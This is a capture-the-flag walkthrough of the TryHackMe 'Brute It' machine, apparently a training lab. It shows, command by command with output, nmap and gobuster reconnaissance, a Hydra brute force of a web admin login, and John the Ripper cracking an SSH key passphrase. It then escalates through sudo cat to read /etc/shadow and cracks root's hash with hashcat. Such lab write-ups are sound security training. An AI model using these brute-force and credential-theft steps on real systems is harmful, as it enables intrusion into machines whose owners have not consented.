# TryHackMe-Brute It

## NMAP


```
Nmap scan report for 10.10.203.79                                         
Host is up (0.18s latency).                                                                                                                         
Not shown: 998 closed ports                                               
PORT   STATE SERVICE VERSION                                                                                                                        
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                   
| ssh-hostkey:                                                                                                                                      
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)                                                                                      
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)                                                                                     
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)                                                                                   
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))                                                                                                 
|_http-server-header: Apache/2.4.29 (Ubuntu)                              
|_http-title: Apache2 Ubuntu Default Page: It works                       
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   
```

From the nmap result we can conclude that 

#1 Search for open ports using nmap.How many ports are open?

`2` ports


#2 What version of SSH is running?

`OpenSSH 7.6p1`

#3 What version of Apache is running?

`2.4.29` 

#4 Which Linux distribution is running?

`Ubuntu`

## Gobuster

<img src="https://imgur.com/XWP9r9A.png"/>

#5 Search for hidden directories on web server.What is the hidden directory?

`/admin`

## PORT 80

We know that there is a `admin` page so lets just visit it to see what's there


<img src="https://imgur.com/hFyCD3E.png"/>

It's good to look at the source of the page

<img src="https://imgur.com/bq7jl1R.png"/>

So username is `admin` for this login page

## Hydra

```
root@kali:~/TryHackMe/Easy/Brute It# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.203.79 http-post-form '/admin/:user=^USER^&pass=^PASS^
&Login=Login:Username or password invalid'                                 
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (thi
s is non-binding, these *** ignore laws and ethics anyway).                                                                                         
                                     
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-07 01:31:15
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.203.79:80/admin/:user=^USER^&pass=^PASS^&Login=Login:Username or password invalid
[80][http-post-form] host: 10.10.203.79   login: admin   password: xavier

```

<img src="https://imgur.com/kh7WBy4.png"/>

Here you'll get the `web flag` and `rsa` private key which is `john`'s ssh private key

```
root@kali:~/TryHackMe/Easy/Brute It# ssh john@10.10.203.79 -i id_rsa 
load pubkey "id_rsa": invalid format
The authenticity of host '10.10.203.79 (10.10.203.79)' can't be established.
ECDSA key fingerprint is SHA256:6/bVnMDQ46C+aRgroR5KUwqKM6J9jAfSYFMQIOKckug.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.203.79' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 

```

Here problem is that they key is password protected so we need to crack it but before cracking it with `johntheripper` we need to have it's hash so let's do that


<img src="https://imgur.com/5KQc0lP.png"/>

Now we got the hash , lets crack this now !

```
root@kali:~/TryHackMe/Easy/Brute It# john --wordlist=/usr/share/wordlists/rockyou.txt hash 

Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (id_rsa)
1g 0:00:00:01 19.56% (ETA: 01:37:16) 0.9345g/s 2821Kp/s 2821Kc/s 2821KC/s ty6868..ty5re
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:04 DONE (2020-11-07 01:37) 0.2145g/s 3077Kp/s 3077Kc/s 3077KC/sa6_123..*7¡Vamos!
Session completed

```
And we got the passpharse of `id_rsa`

<img src="https://imgur.com/mPVDIfB.png"/>

And we are logged in as `john`

```
john@bruteit:~$ ls -al
total 40
drwxr-xr-x 5 john john 4096 Sep 30 14:11 .
drwxr-xr-x 4 root root 4096 Aug 28 14:47 ..
-rw------- 1 john john  394 Sep 30 14:11 .bash_history
-rw-r--r-- 1 john john  220 Aug 16 18:14 .bash_logout
-rw-r--r-- 1 john john 3771 Aug 16 18:14 .bashrc
drwx------ 2 john john 4096 Aug 16 20:25 .cache
drwx------ 3 john john 4096 Aug 16 20:25 .gnupg
-rw-r--r-- 1 john john  807 Aug 16 18:14 .profile
drwx------ 2 john john 4096 Aug 16 20:25 .ssh
-rw-r--r-- 1 john john    0 Aug 16 19:04 .sudo_as_admin_successful
-rw-r--r-- 1 root root   33 Aug 16 18:56 user.txt
john@bruteit:~$ cat user.txt 
THM{a_password_is_not_a_barrier}
john@bruteit:~$ cd /home

```
## Privilege Escalation

Now we can run `sudo -l` to check if the user can run any commands as root
```
john@bruteit:/home$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat

```
As you can see we can read any file by issuing command `cat` as `sudo`

```
john@bruteit:/home$ sudo /bin/cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}

```
Now since we can read any files why not read `/etc/shadow` and crack root's hash in order to privesc

<img src="https://imgur.com/wyZbK6L.png"/>

```
root@kali:~/TryHackMe/Easy/Brute It# hashcat -a 0 -m 1800 --user root_hash /usr/share/wordlists/rockyou.txt
```

In an instant we get

```
                                                                                                                                                    
Host memory required for this attack: 65 MB
                                                                                                                                                    
Dictionary cache hit:                                                                                                                               
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385                                                                                                                              
* Bytes.....: 139921507     
* Keyspace..: 14344385
                                                                                                                                                    
$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:football                  
                                                                                                                                                    
Session..........: hashcat           
Status...........: Cracked                                                
Hash.Name........: sha512crypt $6$, SHA512 (Unix)                                                                                                   
Hash.Target......: $6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ...XEVgL.
Time.Started.....: Sat Nov  7 01:44:41 2020 (0 secs)
Time.Estimated...: Sat Nov  7 01:44:41 2020 (0 secs)                                                                                                
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)                                          
Speed.#1.........:      701 H/s (7.81ms) @ Accel:32 Loops:256 Thr:1 Vec:4 
Recovered........: 1/1 (100.00%) Digests                                  
Progress.........: 128/14344385 (0.00%)
Rejected.........: 0/128 (0.00%)                                          
Restore.Point....: 0/14344385 (0.00%)                                     
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4864-5000
Candidates.#1....: 123456 -> diamond                        
```
It is a lot easy to use `johntheripper` because we only need to specify one or two arguments

```
root@kali:~/TryHackMe/Easy/Brute It# john root_hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
football         (root)
1g 0:00:00:00 DONE (2020-11-07 01:45) 2.380g/s 1219p/s 1219c/s 1219C/s 123456..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed
root@kali:~/TryHackMe/Easy/Brute It# 

```
But still both of them have their own pros and cons , now we can just go over to target machine do `su root` and the password and we got root !